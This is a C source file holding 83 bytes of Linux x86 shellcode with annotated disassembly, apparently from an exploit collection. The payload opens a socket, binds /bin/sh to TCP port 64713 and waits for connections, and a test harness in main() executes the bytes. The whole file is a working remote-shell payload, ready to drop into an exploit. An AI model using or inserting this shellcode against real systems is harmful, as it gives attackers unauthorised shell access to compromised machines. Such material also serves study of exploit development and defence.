/*
 * (linux/x86) portbind /bin/sh (port 64713)
 * 83 bytes
 *
 * http://www.gonullyourself.org
 * sToRm <hixmostorm@hotmail.com>
 */

char shellcode[] =
                                // <_start>:
"\x6a\x66"                      // push   $0x66
"\x58"                          // pop    %eax
"\x31\xdb"                      // xor    %ebx,%ebx
"\x53"                          // push   %ebx
"\x43"                          // inc    %ebx
"\x53"                          // push   %ebx
"\x6a\x02"                      // push   $0x2
"\x89\xe1"                      // mov    %esp,%ecx
"\xcd\x80"                      // int    $0x80
"\x31\xd2"                      // xor    %edx,%edx
"\x52"                          // push   %edx
"\x68\xff\x02\xfc\xc9"          // push   $0xc9fc02ff
"\x89\xe1"                      // mov    %esp,%ecx
"\x6a\x10"                      // push   $0x10
"\x51"                          // push   %ecx
"\x50"                          // push   %eax
"\x89\xe1"                      // mov    %esp,%ecx
"\x89\xc6"                      // mov    %eax,%esi
"\x43"                          // inc    %ebx
"\xb0\x66"                      // mov    $0x66,%al
"\xcd\x80"                      // int    $0x80
"\xb0\x66"                      // mov    $0x66,%al
"\x43"                          // inc    %ebx
"\x43"                          // inc    %ebx
"\xcd\x80"                      // int    $0x80
"\x50"                          // push   %eax
"\x56"                          // push   %esi
"\x89\xe1"                      // mov    %esp,%ecx
"\x43"                          // inc    %ebx
"\xb0\x66"                      // mov    $0x66,%al
"\xcd\x80"                      // int    $0x80
"\x93"                          // xchg   %eax,%ebx
"\x6a\x03"                      // push   $0x3
"\x59"                          // pop    %ecx
                                // <fruity_loops>:
"\x49"                          // dec    %ecx
"\x6a\x3f"                      // push   $0x3f
"\x58"                          // pop    %eax
"\xcd\x80"                      // int    $0x80
"\x75\xf8"                      // jne    <fruity_loops>
"\xf7\xe1"                      // mul    %ecx
"\x51"                          // push   %ecx
"\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
"\x89\xe3"                      // mov    %esp,%ebx
"\xb0\x0b"                      // mov    $0xb,%al
"\xcd\x80"                      // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();

}